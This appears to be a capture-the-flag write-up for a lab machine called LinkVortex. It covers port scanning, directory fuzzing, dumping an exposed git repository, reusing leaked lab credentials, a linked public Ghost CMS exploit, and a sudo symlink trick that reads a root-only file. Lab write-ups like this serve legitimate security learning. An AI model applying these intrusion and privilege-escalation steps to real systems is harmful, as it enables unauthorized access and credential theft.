# Initial Enumeration

## Port Scanning

### Full Detailed Port scan

As always, I will start with a full Detailed port scan. With this we will start to see what ports are open on this ip address.

```
nmap -p- -sCV 10.129.36.206 -vvvv
```        

![](AD_4nXdgzxdYRCgWoN_JoadAt5zAbf-DHPX9xf-xeNpr-iIJqka9_lzeTvkk6I7qpflYAdIJuo69hJ-BR7eyw9LyqwF8-MpjnWylZWintsVaKa3d8WDFT4HvivlTHNzMBbObyKXqoTbx.png)![](AD_4nXe0iZZNJ1aHgDJs8sRHoyng8tQ7zrVlzecJEbz8oyLWZK2ycPEfxewCUYwfm6j0HussLZC8XNt1q86zrhFSRPzc9BXIcOsHfR6ITMMBSPE-BZnKb7_9EyAr0BbrMidIYi7yrfRdxQ.png)
## Directory Fuzzing

A directory fuzzing approach was used to discover hidden directories and files on the web server. This was done using tools such as **Gobuster** or **FFUF**. Use the following example command:

```
ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 0 -c
```

![](AD_4nXfOWBvtk91rNiiyj7s_fNGiyXnAZbLGLDxNWPY-6SLyO0JU-g733zisLwgbHJ3RmBIQhjWb8WOpAcA8sSahz7fyc-Fw-yA5YmpEnJNGDbx4K0EfbPbqWvskPYpQoZ2qPM0D-KRWSA.png)

```
ffuf -u http://linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -fs 0 -c
```
![](AD_4nXduudoL4bWv3yrCwhwXnCQRFjo60CB81RGtBvFuAqXkb04Sbr87j-7VCe8fX7hD-7XIClbGmF90L7L2V_AtYzUCkGwUPKymy9radUx2XLze2M4XsiT-8iDIuEYWmOLhWubHRmkr.png)

email founded in the git/logs.

To get all the content that is in the git subfolder will first need to install a git-dumper. There for i will install GitHack.py `https://github.com/lijiejie/GitHack/tree/master`

![](AD_4nXfvn2szgGeARH1WsR6y0EWVD-vRtGZ2VHRfkRkkzsLm5NqOt2gYC3X8JS98mATP7f14S99aMofPb0SoEMnNX3PjdTKkPDxWxQX-sPJ7rXr-JaALF2iQs4MynNY5uKpkrCVJXNed.png)![](AD_4nXdJd3nrCZ_iyzSlYBZCtmiI6--D8lukb6EfAg1HYfOjcy1AJbroXfJlUYRIdMLP4OGh7QkyJpKt7N1F1gAU8LMglzhaWYv7NKc2OiTRKd9xVbl-IA2MXLnAiDBHOVO0EtVwFdL7SA.png)![](AD_4nXddojO3VPXMVIrt_bNwMAP553X-CiabreZpRaFKb8C9sXUUqTPPTgqcpNh8MFb0cRoVvfuzDtDQipTjMjzgpey-s7IhVmnx5XLVXAVEFUgsPcA_2nBl4aeggnOObcnMM_wdXajn.png)

Here above we can find different path where i will find a password.

I have found in the Authentication file from the path of above. In this file, have i executed the following command to find passwords which we can find in the authentication file.

```
cat authentication.test.js | grep password
```

![](AD_4nXfQDAz1j5_brZJFoeYi5h5y86KFe3jOibdsbxpSG0AUfKRFPfBQo1VrkS_-JaipqS2Ku_z5af2X_xxEDPT1oUz4SC7Tn-4g-aT2pG3cfO4GVuZ-t8BZeIIyu6uhglnAzRaBTQwjPg.png)

Here above we can find the password we will use to login on the following login page.
`http://linkvortex.htb/ghost/#/signin 
Now we can login by using the following credentials:

| Username             | Password           |
| -------------------- | ------------------ |
| admin@linkvortex.htb | OctopiFociPilfer45 |

![](AD_4nXfjK4jUaVUxCGZNk2F8OyIWDzyoOuE_e1Ddei_taBZUmj2PI-tvMbvypVt6MvBKs1pIuGWX2vTHZEsSC2MX07lzy-A1SyayHeMRGSA19drWAeNP_a1z1XzKeImmv67HWTUiNi7B_Q.png)


I logged in on the admin panel and will try to find the version the admin panel is turning on. I have found that the admin panel is using the 5.58 version, so I have found the following github exploit for the admin panel which is version 5.58.
[https://github.com/0xyassine/CVE-2023-40028/tree/master](https://github.com/0xyassine/CVE-2023-40028/tree/master)

![](AD_4nXdV5bPF8krkX8xqH9PFOumhhvxc7fv7sDontwzegzsgaBXjyG5IDBViO7rVEKm0djtn4sdw24TniN5zJoCWbc54Hkyd1oEZz4dfQr6ioCIbWi4vIb9C9gbZ40P8oRkxEOLsxM7bMw.png)![](AD_4nXf67l0KGFwOiC_ega_XPfSi0IDefSGF7Ihb2JrbuhE4Y5iuRmH5bEHvjoCsk5D3DWmWiKuzWxJ0MHz3Tc9NJmDEAwaRwqtHvpoK25Xr72q3_A6M2R99-s2ozLrSH0tj0yDwx4mwFA.png)![](AD_4nXcyMk1XcqtrGPSmPkUATmG2VozVjVKk9cULeChG2kxSO1Y7lJQzdN9HB_j18h9kIbbIC8Rs-qJX7ClL-IByvPoLu6hXS0WglIPYW9n4EeyuaDEOkxjBi-k1PDLwS1o99_2zQIrI.png)

Login credentials for SSH Connection:

| Username           | Password              |
| ------------------ | --------------------- |
| bob@linkvortex.htb | fibber-talented-worth |
FORGET to take a picture of the User flag

With the command `sudo -l` will i see if i can execute a command without knowing the administrator password.
```
sudo -l
```

![image-20241229-201523.png](73859131.png)
We are goiing to make a symbolic link from the root user to the user bob. Then we will use the command check_content to see what the root flag is. 
```
ln -s /root/root.txt wow.txt
ln -s /home/bob/wow.txt wow.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/wow.png
```

![](AD_4nXfDzevKJpNl5Q_RWyb7g69fxL5UwWYT8XeEx-seJ0LU8d-lpjS0S08at3jn2gXipplV3B_zT0ZWADFYEJhQTpgYlW6Svo-VHob9pSa5o61kgKoobiykFf9zWLDnq8PVezPTbalG8A.png)

![[Pasted image 20250210145723.png]]
